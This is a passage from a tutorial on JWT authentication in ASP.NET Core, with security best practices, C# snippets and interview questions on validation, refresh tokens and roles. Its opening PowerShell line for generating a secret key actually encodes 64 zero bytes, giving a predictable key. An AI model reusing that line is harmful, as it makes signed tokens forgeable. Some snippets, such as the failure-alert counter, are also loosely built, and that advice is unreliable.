PowerShell: [Convert]::ToBase64String([byte[]]::new(64))
Linux: openssl rand -base64 64
```

### 3. Short Expiration Times

```
✅ Access Token: 15-60 minutes
✅ Refresh Token: 7-30 days

Short expiration limits damage from stolen tokens
```

### 4. Validate All Token Parameters

```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuer = true,           // ✅
    ValidateAudience = true,         // ✅
    ValidateLifetime = true,         // ✅
    ValidateIssuerSigningKey = true, // ✅
    ClockSkew = TimeSpan.Zero        // ✅ Strict expiration
};
```

### 5. Log Authentication Events

```csharp
options.Events = new JwtBearerEvents
{
    OnAuthenticationFailed = context =>
    {
        Log.Warning("JWT auth failed: {Exception}", context.Exception.Message);
        return Task.CompletedTask;
    },
    OnTokenValidated = context =>
    {
        var userId = context.Principal?.FindFirst("sub")?.Value;
        Log.Information("JWT validated for user: {UserId}", userId);
        return Task.CompletedTask;
    }
};
```

### 6. Use HTTPS Only

```csharp
// Force HTTPS redirection
app.UseHttpsRedirection();

// Enable HSTS (HTTP Strict Transport Security)
app.UseHsts();
```

### 7. Implement Token Revocation (Blacklist)

```csharp
// When user logs out, add JTI to blacklist
public async Task LogoutAsync(string jti)
{
    await _redis.SetAsync($"blacklist:{jti}", "1", TimeSpan.FromHours(1));
}

// Validate token not blacklisted
public async Task<bool> IsTokenBlacklisted(string jti)
{
    var value = await _redis.GetAsync($"blacklist:{jti}");
    return value != null;
}

// In JWT validation
options.Events = new JwtBearerEvents
{
    OnTokenValidated = async context =>
    {
        var jti = context.Principal.FindFirst("jti")?.Value;
        if (await IsTokenBlacklisted(jti))
        {
            context.Fail("Token has been revoked");
        }
    }
};
```

### 8. Don't Store Sensitive Data in JWT

```
✅ Store: User ID, username, email, roles
❌ Never: Passwords, credit cards, SSN, API keys
```

### 9. Use Separate Secrets for Different Environments

```
Development: dev-secret-key-xyz123...
Staging: staging-secret-key-abc456...
Production: prod-secret-key-secure789...

Different secrets prevent cross-environment token misuse
```

### 10. Monitor and Alert on Auth Failures

```csharp
// Track failed authentication attempts
private static readonly Counter AuthFailures = Metrics.CreateCounter(
    "jwt_auth_failures_total",
    "Total number of JWT authentication failures"
);

options.Events = new JwtBearerEvents
{
    OnAuthenticationFailed = context =>
    {
        AuthFailures.Inc();
        
        // Alert if failures exceed threshold
        if (AuthFailures.Value > 100)
        {
            _alertService.SendAlert("High authentication failure rate");
        }
        
        return Task.CompletedTask;
    }
};
```

---

## Interview Questions

### Conceptual Questions

**Q1: What is JWT and how does it differ from session-based authentication?**

**Answer:**
JWT (JSON Web Token) is a self-contained token that includes user information and is digitally signed to prevent tampering. 

Key differences:
- **JWT (Stateless):** Token contains all user info, server doesn't store session data, scales horizontally easily
- **Session (Stateful):** Server stores session data in memory/database, requires session lookup on every request, harder to scale

JWT is better for microservices because services can validate tokens independently without shared session storage.

---

**Q2: Explain the structure of a JWT.**

**Answer:**
JWT has three parts separated by dots:
1. **Header:** Algorithm and token type (`{"alg": "HS256", "typ": "JWT"}`)
2. **Payload:** Claims (user data) (`{"sub": "123", "name": "John"}`)
3. **Signature:** HMACSHA256(base64(header) + "." + base64(payload), secret)

Each part is Base64Url encoded. The signature ensures the token hasn't been tampered with—if someone modifies the payload, the signature won't match.

---

**Q3: Why should JWT expiration times be short?**

**Answer:**
Short expiration times limit the window of opportunity if a token is stolen:
- **Stolen token with 1-hour expiration:** Attacker has 1 hour of access
- **Stolen token with 30-day expiration:** Attacker has 30 days of access

Best practice: 15-60 minutes for access tokens, use refresh tokens for longer sessions. This balances security (short window) with user experience (don't force frequent re-login).

---

**Q4: What is ClockSkew and why might you set it to zero?**

**Answer:**
ClockSkew accounts for time differences between servers. Default is 5 minutes, meaning a token expired 3 minutes ago would still be accepted.

Setting to zero:
- **Pros:** Strict security, no window for using expired tokens
- **Cons:** Requires precise clock synchronization (use NTP)

We use zero for predictability—tokens are valid exactly until expiration, no ambiguity.

---

**Q5: How do you prevent JWT theft via XSS attacks?**

**Answer:**
Store JWTs securely:
1. **Best:** Store in memory (JavaScript variable), lost on page refresh
2. **Good:** httpOnly cookie (JavaScript can't access it)
3. **Avoid:** localStorage/sessionStorage (vulnerable to XSS)

Also use Content Security Policy (CSP) to prevent script injection, and always use HTTPS to prevent man-in-the-middle attacks.

---

### Implementation Questions

**Q6: Write code to generate a JWT in C#.**

**Answer:**
```csharp
private string GenerateJwtToken(User user)
{
    var secretKey = Environment.GetEnvironmentVariable("JWT_SECRET_KEY");
    var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
    var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

    var claims = new[]
    {
        new Claim(JwtRegisteredClaimNames.Sub, user.Id.ToString()),
        new Claim(JwtRegisteredClaimNames.UniqueName, user.Username),
        new Claim(JwtRegisteredClaimNames.Email, user.Email),
        new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
    };

    var token = new JwtSecurityToken(
        issuer: "UserService",
        audience: "BookingSystem",
        claims: claims,
        expires: DateTime.UtcNow.AddMinutes(60),
        signingCredentials: credentials
    );

    return new JwtSecurityTokenHandler().WriteToken(token);
}
```

---

**Q7: How do you configure JWT validation in ASP.NET Core?**

**Answer:**
```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidIssuer = "UserService",
            
            ValidateAudience = true,
            ValidAudience = "BookingSystem",
            
            ValidateLifetime = true,
            ClockSkew = TimeSpan.Zero,
            
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(secretKey)
            )
        };
    });
```

---

**Q8: How do you access JWT claims in a controller?**

**Answer:**
```csharp
[Authorize]
public class BookingsController : ControllerBase
{
    [HttpGet]
    public IActionResult GetMyBookings()
    {
        // Access claims from User property
        var userId = User.FindFirst(JwtRegisteredClaimNames.Sub)?.Value;
        var username = User.FindFirst(JwtRegisteredClaimNames.UniqueName)?.Value;
        
        // Check authentication
        if (!User.Identity.IsAuthenticated)
        {
            return Unauthorized();
        }
        
        // Query bookings for this user
        var bookings = _service.GetBookingsByUserId(Guid.Parse(userId));
        return Ok(bookings);
    }
}
```

---

### Troubleshooting Questions

**Q9: Client gets 401 Unauthorized. How do you debug?**

**Answer:**
Check these in order:
1. **Token present?** Verify Authorization header exists
2. **Token format?** Should be "Bearer eyJhbGc..."
3. **Token expired?** Decode JWT and check "exp" claim
4. **Secret key matches?** Ensure UserService and API Gateway use same key
5. **Issuer/Audience match?** Check token claims vs validation parameters
6. **Signature valid?** Token may have been tampered with

Use logging in JWT events to see specific validation failures.

---

**Q10: Error "IDX10503: Signature validation failed". What's wrong?**

**Answer:**
This means the token signature doesn't match the secret key. Common causes:

1. **Secret key mismatch:** UserService and API Gateway use different keys
   - **Solution:** Ensure both use same JWT_SECRET_KEY environment variable

2. **Token tampering:** Someone modified the payload
   - **Solution:** Token is invalid, client must re-authenticate

3. **Wrong algorithm:** Token signed with HS512, validated with HS256
   - **Solution:** Ensure both use SecurityAlgorithms.HmacSha256

Check logs for specific error details and verify environment variables.

---

### System Design Questions

**Q11: How would you implement refresh tokens?**

**Answer:**
```
Architecture:
- Access Token (JWT): Short expiration (15 min), used for API requests
- Refresh Token: Long expiration (30 days), stored in database, used to get new access tokens

Flow:
1. Login → Return access token + refresh token
2. Client uses access token for API requests
3. Access token expires after 15 min
4. Client sends refresh token to /api/users/refresh
5. Server validates refresh token (check DB, not revoked, not expired)
6. Return new access token + new refresh token
7. Repeat until refresh token expires or revoked

Benefits:
- Short access token expiration (security)
- Avoid frequent re-login (UX)
- Can revoke refresh tokens (logout all devices)

Database:
RefreshTokens table (Id, UserId, Token, ExpiresAt, Revoked, CreatedAt)
```

---

**Q12: How do you scale JWT authentication across multiple API Gateway instances?**

**Answer:**
JWT is stateless, so it scales naturally:

```
┌─────────┐
│ Client  │
└────┬────┘
     │ JWT: eyJhbGc...
     ├────────────────────┬────────────────────┬───────────────────
     ▼                    ▼                    ▼
┌──────────┐         ┌──────────┐         ┌──────────┐
│ Gateway  │         │ Gateway  │         │ Gateway  │
│Instance 1│         │Instance 2│         │Instance 3│
└──────────┘         └──────────┘         └──────────┘

Each instance validates JWT independently:
✅ No shared session storage needed
✅ No cache synchronization required
✅ Each instance has same secret key (from environment variable)
✅ Load balancer distributes requests evenly

Considerations:
- All instances must use same secret key
- Clock synchronization (NTP) for expiration checks
- Consider Redis for token blacklist (logout/revoke)
```

---

**Q13: How would you implement different access levels (roles/permissions)?**

**Answer:**
Add role claims to JWT payload:
```csharp
var claims = new[]
{
    new Claim(JwtRegisteredClaimNames.Sub, user.Id.ToString()),
    new Claim(ClaimTypes.Role, "Admin"),           // Role claim
    new Claim("permissions", "bookings.read"),     // Permission claim
    new Claim("permissions", "bookings.write"),
    new Claim("permissions", "payments.read")
};
```

Configure authorization policies:
```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("Admin", policy => policy.RequireRole("Admin"));
    
    options.AddPolicy("CanCreateBooking", policy =>
        policy.RequireClaim("permissions", "bookings.write"));
    
    options.AddPolicy("CanViewPayments", policy =>
        policy.RequireClaim("permissions", "payments.read"));
});
```

Use in controllers:
```csharp
[Authorize(Policy = "CanCreateBooking")]
public IActionResult CreateBooking() { ... }

[Authorize(Roles = "Admin")]
public IActionResult DeleteUser() { ... }
```

---

## Summary

JWT authentication provides:
- ✅ **Stateless authentication** - no session storage needed
- ✅ **Scalable** - services validate tokens independently
- ✅ **Self-contained** - token includes all user info
- ✅ **Verifiable** - digitally signed to prevent tampering
- ✅ **Standardized** - works across platforms and languages

**Key Takeaways:**
1. JWT = Header + Payload + Signature (Base64Url encoded)
2. Token is **encoded**, not encrypted—never store sensitive data
3. Use **strong secret keys** (256+ bits) from environment variables
4. Set **short expiration** times (15-60 minutes)
5. Always use **HTTPS** to prevent token interception
6. Validate **all parameters** (issuer, audience, lifetime, signature)
7. Store securely client-side (memory > httpOnly cookie > localStorage)
8. Consider **refresh tokens** for better UX without sacrificing security

JWT is perfect for microservices because it eliminates shared session storage and enables independent, scalable authentication validation across distributed services!
